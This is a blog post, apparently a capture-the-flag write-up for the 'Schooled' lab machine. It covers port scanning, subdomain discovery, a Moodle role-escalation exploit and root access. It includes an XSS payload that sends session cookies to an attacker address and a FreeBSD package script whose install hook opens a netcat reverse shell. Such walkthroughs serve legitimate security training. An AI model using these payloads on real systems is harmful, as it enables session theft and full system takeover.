@@ -1,0 +1,265 @@
+<!DOCTYPE html>
+<html lang="en"> 
+<head>
+    <title>schooled writeup</title>
+    
+    <!-- Meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Blog Template">
+    <meta name="author" content="Xiaoying Riley at 3rd Wave Media">    
+    <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico"> 
+    
+    <!-- FontAwesome JS-->
+    <script defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
+    
+    <!-- Plugin CSS -->
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.14.2/styles/monokai-sublime.min.css">
+    
+    <!-- Theme CSS -->  
+    <link id="theme-style" rel="stylesheet" href="assets/css/theme-7.css">
+    
+
+</head> 
+
+<body>
+    
+
+    <header class="header text-center">	    
+	    <h1 class="blog-name pt-lg-4 mb-0"><a href="index.html">Taqhi's Blog</a></h1>
+        
+	    <nav class="navbar navbar-expand-lg navbar-dark" >
+           
+			<button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navigation" aria-controls="navigation" aria-expanded="false" aria-label="Toggle navigation">
+			<span class="navbar-toggler-icon"></span>
+			</button>
+
+			<div id="navigation" class="collapse navbar-collapse flex-column" >
+				<div class="profile-section pt-3 pt-lg-0">
+				    <img class="profile-image mb-3 rounded-circle mx-auto" src="assets/images/profile.png" alt="image" >			
+					
+					<div class="bio mb-3">Hi, my name is Taqhi.<br><a href="about.html">Find out more about me</a></div><!--//bio-->
+					<ul class="social-list list-inline py-3 mx-auto">
+			            <li class="list-inline-item"><a href="#"><i class="fab fa-twitter fa-fw"></i></a></li>
+			            <li class="list-inline-item"><a href="#"><i class="fab fa-github-alt fa-fw"></i></a></li>
+			            <li class="list-inline-item"><a href="#"><i class="fab fa-codepen fa-fw"></i></a></li>
+			        </ul><!--//social-list-->
+			        <hr> 
+				</div><!--//profile-section-->
+				
+				<ul class="navbar-nav flex-column text-left">
+					<li class="nav-item">
+					    <a class="nav-link" href="index.html"><i class="fas fa-home fa-fw mr-2"></i>Blog Home <span class="sr-only">(current)</span></a>
+					</li>
+					<li class="nav-item active">
+					    <a class="nav-link" href="blog-post.html"><i class="fas fa-bookmark fa-fw mr-2"></i>Blog Post</a>
+					</li>
+					<li class="nav-item">
+					    <a class="nav-link" href="about.html"><i class="fas fa-user fa-fw mr-2"></i>About Me</a>
+					</li>
+				</ul>
+				
+				<div class="my-2 my-md-3">
+					
+				    
+				</div>
+			</div>
+		</nav>
+    </header>
+    
+    <div class="main-wrapper">
+	    
+
+	    <article class="blog-post px-3 py-5 p-md-5">
+		    <div class="container">
+			    <header class="blog-post-header">
+				    <h2 class="title mb-2">Schooled Writeup</h2>
+				    <div class="meta mb-3"><span class="date">Publishing soon</span><span class="time">10 min read</span><span class="comment"><a href="#"></a></span></div>
+			    </header>
+			    
+			    <div class="blog-post-body">
+				    <figure class="blog-banner">
+				        <img class="img-fluid" src="assets/images/blog/blog-post-banner.jpg" alt="image"></a>
+				    </figure>
+				    
+				    <h3 class="mt-5 mb-3">Nmap</h3>
+				    <pre>
+					    <code>
+➜  schooled cat nmap/allportsdetailed
+# Nmap 7.91 scan initiated Sat May 15 10:37:08 2021 as: nmap -sV -sV -p22,80,33060 -v -oN nmap/allportsdetailed 10.10.10.234
+Nmap scan report for schooled.htb (10.10.10.234)
+Host is up (0.058s latency).
+
+PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 7.9 (FreeBSD 20200214; protocol 2.0)
+80/tcp    open  http    Apache httpd 2.4.46 ((FreeBSD) PHP/7.4.15)
+33060/tcp open  mysqlx?
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port33060-TCP:V=7.91%I=7%D=5/15%Time=609FDC9B%P=x86_64-pc-linux-gnu%r(N
+SF:ULL,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(GenericLines,9,"\x05\0\0\0\x0b\
+SF:\x88'\x1a\x0fInvalid\x20message\"\x05HY000");
+Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Sat May 15 10:37:26 2021 -- 1 IP address (1 host up) scanned in 18.79 seconds
+					    </code>
+					</pre>
+					<p> Here we have three ports open lets try with port 80. </p>
+					<p>	Not much useful but the teachers section will be useful later in this writeup.</p>
+					<img class="img-fluid" src="assets/images/blog/teachersupdated.png" alt="image">
+					<h3 class="mt-5 mb-3">Sub-Domain Enumeration</h3>
+					<pre>
+						<code>
+➜ schooled  ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://schooled.htb/ -H 'Host: FUZZ.schooled.htb' -fs 20750
+
+
+/'___\  /'___\           /'___\
+/\ \__/ /\ \__/  __  __  /\ \__/
+\ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+ \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+  \ \_\   \ \_\  \ \____/  \ \_\
+   \/_/    \/_/   \/___/    \/_/
+
+v1.3.0 Kali Exclusive <3
+________________________________________________
+
+	:: Method           : GET
+	:: URL              : http://schooled.htb/
+	:: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+	:: Header           : Host: FUZZ.schooled.htb
+	:: Follow redirects : false
+	:: Calibration      : false
+	:: Timeout          : 10
+	:: Threads          : 40
+	:: Matcher          : Response status: 200,204,301,302,307,401,403,405
+	:: Filter           : Response size: 20750
+________________________________________________
+
+moodle                  [Status: 200, Size: 84, Words: 5, Lines: 2]
+:: Progress: [4989/4989] :: Job [1/1] :: 85 req/sec :: Duration: [0:01:04] :: Errors: 0 ::
+						</code>
+					</pre>
+					<p> I have tried directory bruteforcing and found nothing. Then tried sub domain enum and found moodle save <a href="http://moodle.schooled.htb/" target="_blank">http://moodle.schooled.htb/</a> in your hosts file.</p>
+					<p>For more info of moodle <a href="https://en.wikipedia.org/wiki/Moodle" target="_blank">Wikipedia</a> ("Moodle is a free and open-source learning management system (LMS) written in PHP and distributed under the GNU General Public License. Developed on pedagogical principles, Moodle is used for blended learning, distance education, flipped classroom and other e-learning projects in schools, universities, workplaces and other sectors.")</p>
+					<h3 class="mt-5 mb-3"> Creating Moodle Account </h3>
+					<img class="img-fluid" src="assets/images/blog/signup.png" alt="image">
+					
+					<p> After signnp go to the mathemetics section and enroll the course</p>
+					<img class="img-fluid" src="assets/images/blog/enroll.png" alt="image">
+					<p>After enrolling into the course go to the announcements section and it says set MoodleNet profile. </p>
+					<img class="img-fluid" src="assets/images/blog/hint.png" alt="image">
+					<p> Now i randomly put xss payloads and saved it and i got a popup.</p>
+					<img class="img-fluid" src="assets/images/blog/xss.png" alt="image">
+					<img class="img-fluid" src="assets/images/blog/xsspwned.png" alt="image">
+					<pre><code> &lt;img src=1 href=1 onerror="javascript:alert("pwned")">  </img> </code></pre>
+					<pre> <code> &lt;img src=x onerror=this.src='http://YOURIP/?'+document.cookie;> </code></pre>
+					<p>Use the above payload and the start python server at 80 and Browsw to the Mathemetics section we will get the "Manuel Philips" cookie.</p>
+					<img class="img-fluid" src="assets/images/blog/getingcookie.jpg" alt="image">
+					<p> ctrl + shift + c to open inspect elemnt and go to the storage and replace to "Manuel philips"cookie. we have the "Manuel philips" account.</p>
+					<p>Now at the bottom of the page we can see the moodle docs open it and we can see the moodle version it is 3.9 google for exploit.</p>
+					<p>We can see that it has a RCE <a href="https://www.youtube.com/watch?v=BkEInFI4oIU" target="_blank">Youtube</a> video.</p>
+					<p>Another source <a href="https://github.com/HoangKien1020/CVE-2020-14321" target="_blank">Github. </a></p>
+					<p>Now go to the participants section and enroll users add "lianne carter" and intercept the request in burp and send it to the repeater.</p>
+					<img class="img-fluid" src="assets/images/blog/burp.jpg" alt="image">
+					<p>Change the 25 vale to our id value 24 and role 5 to role 1 and we can see the it is 200 ok.</p>
+					<p>And below the participants click "Manuel philips" we can see he is a manager</p>
+					<img class="img-fluid" src="assets/images/blog/phpmanager.png" alt="image">
+					<p>Now click "lianne carter" and login as administrator and we can see that we got a option as site administrator.</p>
+					<img class="img-fluid" src="assets/images/blog/siteadmin.png" alt="image">
+					<p>Go to users and define roles and go to the manager and edit and do nothing and go to the bottom of the Page save roles and intercept the request.</p>
+					<p>Go to the <a href="https://github.com/HoangKien1020/CVE-2020-14321" target="_blank">Github Page</a> and replace the request. </p>
+					<img class="img-fluid" src="assets/images/blog/req.png" alt="image">
+					<img class="img-fluid" src="assets/images/blog/plug.png" alt="image">
+					<p>Upload the zip file as in github. I changed it to reverse shell.</p>
+					<p>Then go to http://moodle.schooled.htb/moodle/blocks/rce/lang/en/block_rce.php we will get a shell back.</p>
+					<img class="img-fluid" src="assets/images/blog/revshell.png" alt="image">
+					<p>Go to the /usr/local/www/apache24/data/moodle directory we can find config.php file</p>
+					<img class="img-fluid" src="assets/images/blog/config.png" alt="image">
+					<p>Here there are bunch of hashes are present take the admin hash and crack it</p>
+					<img class="img-fluid" src="assets/images/blog/adminhash.png" alt="image">
+					<p>The hash was sucessfully cracked</p>
+					<img class="img-fluid" src="assets/images/blog/crackedhash.png" alt="image">
+					<h3 class="mt-5 mb-3">Privesec</h3>
+					<p>Now jush ssh into the box with the crakced password to jamie. And check wheather jamie has sudo commands.</p>
+					<img class="img-fluid" src="assets/images/blog/sudo.png" alt="image">
+					<p>The user jamie has package install and update sudo permissions.</p>
+					<p>And i google searched the and i found the <a href="https://notes.vulndev.io/notes/redteam/privilege-escalation/misc-1#install-malicious-pkg-package-freebsd" target="_blank"> xct's website</a></p>
+					<img class="img-fluid" src="assets/images/blog/ggle.png" alt="image">
+					<img class="img-fluid" src="assets/images/blog/xct.png" alt="image">
+					<p>Tried the payload but it did not worked for me :(</p>
+					<p>Below is the source of the website for <a href="http://lastsummer.de/creating-custom-packages-on-freebsd/" target="_blank"> creating-custom-packages-on-freebsd.</a></p>
+					<pre>
+					<code>
+
+#!/bin/sh
+STAGEDIR=/tmp/package
+rm -rf ${STAGEDIR}
+mkdir -p ${STAGEDIR}
+cat >> ${STAGEDIR}/+PRE_INSTALL &lt;&lt;EOF
+echo "Resetting root shell"
+rm /tmp/a;mkfifo /tmp/a;cat /tmp/a|/bin/sh -i 2>&1|nc 10.10.14.10 9002 >/tmp/a
+EOF
+cat >> ${STAGEDIR}/+POST_INSTALL &lt;&lt;EOF
+echo "Registering root shell"
+pw usermod -n root -s /bin/sh
+EOF
+cat >> ${STAGEDIR}/+MANIFEST &lt;&lt;EOF
+name: mypackage
+version: "1.0_5"
+origin: sysutils/mypackage
+comment: "automates stuff"
+desc: "automates tasks which can also be undone later"
+maintainer: john@doe.it
+www: https://doe.it
+prefix: /
+EOF
+pkg create -m ${STAGEDIR}/ -r ${STAGEDIR}/ -o .
+				
+					</code>
+					</pre>
+					<p>Change to your ip and port. and change the permission and execute</p>
+					<p>Open your netcat listener. And executing the file named "mypackage-1.0.5.txz" will be created and run it the shell will be spawned.</p>
+					<img class="img-fluid" src="assets/images/blog/root.png" alt="image">
+				    
+				   
+			    </div>
+				    
+			    <nav class="blog-nav nav nav-justified my-5">
+				  <a class="nav-link-prev nav-item nav-link rounded-left" href="index.html">Previous<i class="arrow-prev fas fa-long-arrow-alt-left"></i></a>
+				  <a class="nav-link-next nav-item nav-link rounded-right" href="blog-list.html">Next<i class="arrow-next fas fa-long-arrow-alt-right"></i></a>
+				</nav>
+				
+				
+				
+		    </div><!--//container-->
+	    </article>
+	    
+	    
+    
+    </div><!--//main-wrapper-->
+    
+
+    
+
+    
+       
+    <!-- Javascript -->          
+    <script src="assets/plugins/jquery-3.3.1.min.js"></script>
+    <script src="assets/plugins/popper.min.js"></script> 
+    <script src="assets/plugins/bootstrap/js/bootstrap.min.js"></script> 
+    
+    <!-- Page Specific JS -->
+    <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.14.2/highlight.min.js"></script>
+
+    <!-- Custom JS -->
+    <script src="assets/js/blog.js"></script>
+    
+    <!-- Style Switcher (REMOVE ON YOUR PRODUCTION SITE) -->
+    <!-- <script src="assets/js/demo/style-switcher.js"></script>      -->
+    
+
+</body>
+</html> 
+
